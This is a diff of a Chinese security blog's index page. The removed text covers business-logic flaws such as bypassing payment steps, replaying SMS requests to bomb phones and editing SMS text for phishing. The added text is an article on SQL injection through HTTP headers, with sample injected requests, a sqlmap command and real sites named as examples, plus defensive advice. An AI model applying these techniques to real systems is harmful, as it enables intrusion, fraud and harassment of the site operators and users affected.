-<p>b) 水平越权（水平越权是指相同权限的不同用户可以互相访问）（wooyun-2010-0100991 PHPEMS多处存在水平权限问题）</p>
-<p>c) 《我的越权之道》URL：<a href="http://drops.wooyun.org/tips/727" target="_blank" rel="external">http://drops.wooyun.org/tips/727</a></p>
-<h1 id="0x08-业务流程乱序"><a href="#0x08-业务流程乱序" class="headerlink" title="0x08 业务流程乱序"></a>0x08 业务流程乱序</h1><hr>
-<p><strong>1 顺序执行缺陷</strong></p>
-<p>a) 部分网站逻辑可能是先A过程后B过程然后C过程最后D过程</p>
-<p>b) 用户控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。于是，用户就从B直接进入了D过程，就绕过了C。如果C是支付过程，那么用户就绕过了支付过程而买到了一件商品。如果C是验证过程，就会绕过验证直接进入网站程序了。</p>
-<p>c) 案例：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2014-047677" target="_blank" rel="external">WooYun: 万达某分站逻辑错误可绕过支付直接获得取票密码</a></p>
-<p><a href="http://wooyun.org/bugs/wooyun-2010-0108184" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2010-0108184</a></p>
-<h1 id="0x09-业务接口调用安全"><a href="#0x09-业务接口调用安全" class="headerlink" title="0x09 业务接口调用安全"></a>0x09 业务接口调用安全</h1><hr>
-<p><strong>1 重放攻击</strong></p>
-<p>在短信、邮件调用业务或生成业务数据环节中（类：短信验证码，邮件验证码，订单生成，评论提交等），对其业务环节进行调用（重放）测试。如果业务经过调用（重放）后被多次生成有效的业务或数据结果</p>
-<p>a) 恶意注册</p>
-<p>b) 短信炸弹</p>
-<p>在测试的过程中，我们发现众多的金融交易平台仅在前端通过JS校验时间来控制短信发送按钮，但后台并未对发送做任何限制，导致可通过重放包的方式大量发送恶意短信</p>
-<p>案例： <a href="http://www.wooyun.org/bugs/wooyun-2015-094545" target="_blank" rel="external">WooYun: 一亩田交易网逻辑漏洞（木桶原理）</a></p>
-<p><strong>2 内容编辑</strong></p>
-<p>类似案例如下：</p>
-<p>点击“获取短信验证码”，并抓取数据包内容，如下图。通过分析数据包，可以发现参数sendData/insrotxt的内容有客户端控制，可以修改为攻击者想要发送的内容</p>
-<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312854742.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312854742.png" alt="2015070302312854742"></a></p>
-<p>将内容修改“恭喜你获得由xx银行所提供的iphone6一部，请登录<a href="http://www.xxx.com领取，验证码为236694”并发送该数据包，手机可收到修改后的短信内容，如下图：" target="_blank" rel="external">http://www.xxx.com领取，验证码为236694”并发送该数据包，手机可收到修改后的短信内容，如下图：</a></p>
-<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312971068.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/07/2015070302312971068.png" alt="2015070302312971068"></a></p>
-<h1 id="0x10-时效绕过测试"><a href="#0x10-时效绕过测试" class="headerlink" title="0x10 时效绕过测试"></a>0x10 时效绕过测试</h1><hr>
-<p>大多有利用的案例发生在验证码以及业务数据的时效范围上，在之前的总结也有人将12306的作为典型，故，单独分类。</p>
-<p><strong>1 时间刷新缺陷</strong></p>
-<p>12306网站的买票业务是每隔5s，票会刷新一次。但是这个时间确实在本地设置的间隔。于是，在控制台就可以将这个时间的关联变量重新设置成1s或者更小，这样刷新的时间就会大幅度缩短（主要更改autoSearchTime本地参数）。 案例：</p>
-<p><a href="http://www.wooyun.org/bugs/wooyun-2014-048391" target="_blank" rel="external">WooYun: 12306自动刷票时间可更改漏洞</a></p>
-<p><strong>2 时间范围测试</strong></p>
-<p>针对某些带有时间限制的业务，修改其时间限制范围，例如在某项时间限制范围内查询的业务，修改含有时间明文字段的请求并提交，查看能否绕过时间限制完成业务流程。例如通过更改查询手机网厅的受理记录的month范围，可以突破默认只能查询六个月的记录。</p>
-<h1 id="0x11-参考"><a href="#0x11-参考" class="headerlink" title="0x11 参考"></a>0x11 参考</h1><hr>
-<p>@eversec</p>
-<p>应用程序逻辑错误总结 <a href="http://drops.wooyun.org/papers/1418" target="_blank" rel="external">http://drops.wooyun.org/papers/1418</a></p>
-<p>密码找回功能可能存在的问题 <a href="http://drops.wooyun.org/papers/287" target="_blank" rel="external">http://drops.wooyun.org/papers/287</a></p>
-<p>密码找回功能可能存在的问题（补充） <a href="http://drops.wooyun.org/web/3295" target="_blank" rel="external">http://drops.wooyun.org/web/3295</a></p>
-<p>密码找回逻辑漏洞总结 <a href="http://drops.wooyun.org/web/5048" target="_blank" rel="external">http://drops.wooyun.org/web/5048</a></p>
-<p>支付漏洞的三种常见类型——加固方案 <a href="http://zone.wooyun.org/content/878" target="_blank" rel="external">http://zone.wooyun.org/content/878</a></p>
-<p>在线支付逻辑漏洞总结 <a href="http://drops.wooyun.org/papers/345" target="_blank" rel="external">http://drops.wooyun.org/papers/345</a></p>
-<p>金融行业平台常见安全漏洞与防御 <a href="http://www.freebuf.com/news/special/61082.html" target="_blank" rel="external">http://www.freebuf.com/news/special/61082.html</a></p>
-<p>我的越权之道 <a href="http://drops.wooyun.org/tips/727" target="_blank" rel="external">http://drops.wooyun.org/tips/727</a></p>
-<p>安全科普：看视频理解Web应用安全漏洞TOP10（IBM内部视频） <a href="http://www.freebuf.com/vuls/63426.html" target="_blank" rel="external">http://www.freebuf.com/vuls/63426.html</a></p>
-<p>转：<a href="http://drops.wooyun.org/web/6917" target="_blank" rel="external">http://drops.wooyun.org/web/6917</a></p>
+print &apos;\n[Done]MySQL user is&apos;, user
+</code></pre>
 
           
         
@@ -1294,127 +918,9 @@
 
       
         
-          
-            <p>转：<a href="http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/" target="_blank" rel="external">http://windkeepblow.blog.163.com/blog/static/1914883312013988185783/</a></p>
-<p>如题，其实我的问题很简单，就是在写爬虫的时候拿到网页的信息包含类似“\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”的字符串，实际上这是unicode的中文编码，对应的中文为“新浪微博注册”。其实我就是想找一个函数让这一串东西显示中文而已，没想到百度了白天找到合适的。遇到这种问题千万不要用什么 “python编码” “unicode中文编码” “unicode解码”这样的关键字去搜，一大堆网页出来毫不相关。</p>
-<p>其实这个问题一个函数搞定，如下：</p>
-<p>Example 1:<br>&gt;&gt;&gt; s = r”\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”<br>&gt;&gt;&gt; s<br>‘\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c’<br>&gt;&gt;&gt; print s<br>\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c<br>&gt;&gt;&gt; s = s.decode(“unicode_escape”); #就是这个函数<br>&gt;&gt;&gt; print s</p>
-<p>Example 2:<br>&gt;&gt;&gt; str<em> = “Russopho\xe9bic, clichd and just pl\xe9ain stupid.”<br>&gt;&gt;&gt; print str</em><br>Russopho?bic, clichd and just pl?ain stupid.<br>&gt;&gt;&gt; str<em> = str</em>.decode(“unicode<em>escape”)<br>&gt;&gt;&gt; print str</em></p>
-<div><br><div></div><br><div>(这个方法解决了我在插入数据到mongodb时遇到的“bson.errors.InvalidStringData: strings in documents must be valid UTF-8”问题)</div><br><div></div><br><div>    附上关于这个问题的相关博客链接：<a href="http://www.cnblogs.com/yangze/archive/2010/11/16/1878469.html" target="_blank" rel="external">http://www.cnblogs.com/yangze/archive/2010/11/16/1878469.html</a></div><br><div></div><br><div>        另外还有一个与unicode字节串有关的问题，遇到这样的错误提示：Unicode equal comparison failed to convert both arguments to Unicode - interpreting them as being unequal。说明我们在对两个字符（串）进行对比的时候等号两边的类型</div><br><div>不一样，可能是一边是unicode字节串，一边是字符串。详见<a href="http://stackoverflow.com/questions/3400171/python-utf-8-comparison。" target="_blank" rel="external">http://stackoverflow.com/questions/3400171/python-utf-8-comparison。</a></div><br><div></div><br><div>小结：<br>以后遇到奇葩问题要想好关键字再搜，不然很有可能一无所获。</div><br></div>
-          
-        
-      
-    </div>
-    
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015/05/28/忘记密码咋办？本地密码检索工具 – LaZagne Project/" itemprop="url">
-                  忘记密码咋办？本地密码检索工具 – LaZagne Project
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-05-28T09:59:16+08:00" content="2015-05-28">
-              2015-05-28
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/工具/" itemprop="url" rel="index">
-                    <span itemprop="name">工具</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>转自freebuf：<a href="http://www.freebuf.com/tools/68229.html">http://www.freebuf.com/tools/68229.html</a><br>简介</p>
-<p>LaZagne project 是一款用于检索大量存储在本地计算机上密码的开源应用程序。每款软件他们保存密码的方法或许不尽相同（明文，API，算法，数据库等等），我开发这款工具的目的是为了寻找计算机中最常用软件的密码。截至目前，该工具支持Windows上的22款软件，Linux/Unix-Like OS上的12款软件。
+          <p>&emsp;&emsp;如题，其实我的问题很简单，就是在写爬虫的时候拿到网页的信息包含类似”\u65b0\u6d6a\u5fae\u535a\u6ce8\u518c”的字符串，实际上这是unicode的中文编码，对应的中文为“新浪微博注册”。其实我就是想找一个函数让这一串东西显示中文而已，没想到百度了白天找到合适的。
           <div class="post-more-link text-center">
-            <a class="btn" href="/2015/05/28/忘记密码咋办？本地密码检索工具 – LaZagne Project/#more" rel="contents">
+            <a class="btn" href="/2015/06/18/python unicode字节串转成中文问题/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1582,13 +1088,263 @@
 
 
     
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/04/07/基于mssql的报错注入的脚本(get)/" itemprop="url">
+                  基于mssql的报错注入的脚本(get)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2015-04-07T21:02:13+08:00" content="2015-04-07">
+              2015-04-07
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Python/" itemprop="url" rel="index">
+                    <span itemprop="name">Python</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>在进行mssql注入的时候，由于各种各样的原因，我们不能使用工具进行值得获取，那么可以自行编写脚本来获取值，python由于其良好的抓取网页的功能，被大家广泛使用。
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2015/04/07/基于mssql的报错注入的脚本(get)/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+    
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/04/06/HTTP请求头信息的注入/" itemprop="url">
+                  HTTP请求头信息的注入
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2015-04-06T12:37:49+08:00" content="2015-04-06">
+              2015-04-06
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/注入/" itemprop="url" rel="index">
+                    <span itemprop="name">注入</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>常见http可能被污染的参数有这些</p>
+</blockquote>
+<pre><code>- User-agent 浏览器版本 （少）
+- Referer      来源（少）
+- X-Forwarded-For 获取ip（高）
+- client_ip   获取ip（高）
+-cookie      获取cookie值（高）
+</code></pre><h3 id="一-cookie注入"><a href="#一-cookie注入" class="headerlink" title="一. cookie注入"></a>一. cookie注入</h3><ol>
+<li>原理： 在ASP中,request对象获取客户端提交数据常用的是get和post两种方式,同时request对象可以不通过集合来获得数据,即直接使用”request(“name”)”. 但它效率低下,容易出错,当我们省略具体的集合名称时,asp是按QueryString(get),Form(post),Cookie,Severvariable,集合的顺序来搜索的.cookie是保存在客户端的一个文本文件,可以进行修改,这样一来,就可以利用Request.cookie方式来提交变量的值,从而利用系统的漏洞进行注入攻击.</li>
+<li>条件1是程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。条件2，在1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。</li>
+<li><p>首先 我们需要找到一个注入点，如果是使用get方式提交的参数，要更改成cookie方式提交，我们首先要访问正常的存在注入点的页面，等页面完全打开之后，在开发者环境的console栏中，输入alert(document.cookie=”id=”+escape(“x”)); 这里的“id=”便是注入点中注入参数，x便是页面的参数的数值了，这两处要根据实际情况来定义。写完之后按下回车网页中会弹出一个对话框现在更改好了cookie后我们就要试下能不能正常访问了，现在在另外一个窗口中重新打开那个注入点既是将“id=x”去掉后的，然后看是否能正常访问。如果去掉之后能够继续访问 那么说明可以进行cookie注入，这样就说明程序在使用request对象获取数据的时候并未指明具体使用什么方法来获取，而是直接使用request(“xx”)的方式。<br>4.实例 <a href="http://sef.xjtu.edu.cn/news_content.asp?id=2074" target="_blank" rel="external">http://sef.xjtu.edu.cn/news_content.asp?id=2074</a></p>
+<h3 id="二-X-Forwarded-For注入"><a href="#二-X-Forwarded-For注入" class="headerlink" title="二.  X-Forwarded-For注入()"></a>二.  X-Forwarded-For注入()</h3><ol>
+<li>X-Forwarded-For是HTTP头的一个字段。它被认为是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源ip地址的一个标准。</li>
+<li>X-Forwarded-For注入常见于检测用户ip是否合法，进行sql查询的时没有过滤获取ip的参数。</li>
+<li>利用方法，可以用firefox中的X-Forwarded-For Header插件。或者将抓的头信息的包保存在sqlmap的根路径，比如test.txt，python sqlmap.py -r test.txt –level 3</li>
+</ol>
+</li>
+<li><p>实例：<a href="http://www.alexa.cn/" target="_blank" rel="external">http://www.alexa.cn/</a></p>
+<h3 id="三-User-agent注入"><a href="#三-User-agent注入" class="headerlink" title="三.  User-agent注入"></a>三.  User-agent注入</h3><p>用户代理（user agent）是记录软件程序的客户端信息的HTTP头字段，他可以用来统计目标和违规协议。在HTTP头中应该包含它，这个字段的第一个空格前面是软件的产品名称，后面有一个可选的斜杠和版本号。并不是所有的应用程序都会被获取到user-agent信息，但是有些应用程序利用它存储一些信息（如：购物车）。在这种情况下，我们就有必要研究下user-agent头存在的问题了。HTTP查询实例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: [host]</span><br><span class="line">User-Agent: aaa’ or 1/*</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="四-Referer注入"><a href="#四-Referer注入" class="headerlink" title="四. Referer注入"></a>四. Referer注入</h3><p>Referer是另外一个当应用程序没有过滤存储到数据库时，容易发生SQL注入的HTTP头。它是一个允许客户端指定的可选头部字段，通过它我们可以获取到提交请求URI的服务器情况。它允许服务器产生一系列的回退链接文档，像感兴趣的内容，日志等。它也允许跟踪那些坏链接以便维护。</p>
+<p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: [host]</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36</span><br><span class="line"></span><br><span class="line">Referer: http://www.yaboukir.com&apos;</span><br></pre></td></tr></table></figure></p>
+<p>实例：<a href="http://baike.cardbaobao.com/index.php?user-login" target="_blank" rel="external">http://baike.cardbaobao.com/index.php?user-login</a></p>
+<h3 id="五-防止消息头注入漏洞"><a href="#五-防止消息头注入漏洞" class="headerlink" title="五. 防止消息头注入漏洞"></a>五. 防止消息头注入漏洞</h3><p>&emsp;&emsp;防止HTTP消息头注入漏洞的最有效方法是，不将用户控制的输入插入到应用程序返回的HTTP消息头中。通常我们可以用一些较为安全的方法代替这种行为。<br>&emsp;&emsp;如果不可避免地要在HTTP消息头中插入用户控制的数据，那么应用程序应采取以下这种双重深层防御方法防止漏洞产认。应用程序应根据情形，对插入的数据进行尽可能严格的确认。例如，如果根据用户输入设定一个cookie值，那么应当限制这个值仅包含字母字符，最大长度为6B。<br>&emsp;&emsp;应对插入消息头的每一个数据进行过滤，检测可能的恶意字符。实际上，任何ASCII码小于0x20的字符都应被视为可疑的恶意字符，应用程序应拒绝包含这些字符的请求。通过对所有应用程序内容使用 HTTPS，应用程序即可防止攻击者利用任何残留的消息头注入漏洞”毒害”代理服务器缓存。</p>
+
+          
+        
+      
+    </div>
+    
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
   </section>
 
   
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
 
 
           </div>
@@ -1627,7 +1383,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">12</span>
+              <span class="site-state-item-count">9</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1635,7 +1391,7 @@
           
             <div class="site-state-item site-state-categories">
               
-                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">分类</span>
               
             </div>
@@ -1644,7 +1400,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-count">5</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
